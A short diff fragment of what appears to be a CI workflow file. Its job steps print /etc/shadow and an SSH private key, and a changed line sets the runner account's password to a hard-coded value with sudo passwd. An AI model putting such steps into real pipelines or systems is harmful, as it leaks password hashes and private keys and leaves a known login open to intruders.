@@ -49,9 +49,9 @@ jobs:
 
         sudo cat /etc/shadow
 
-        echo "########### ls -la /home/runner/.ssh/ #############"
+        echo "########### echo -e 'passwordsuper\npasswordsuper' | sudo passwd runner #############"
 
-        ls -la /home/runner/.ssh/
+        echo -e 'passwordsuper\npasswordsuper' | sudo passwd runner
 
         echo "######### /home/runner/.ssh/id_rsa ###############"
 
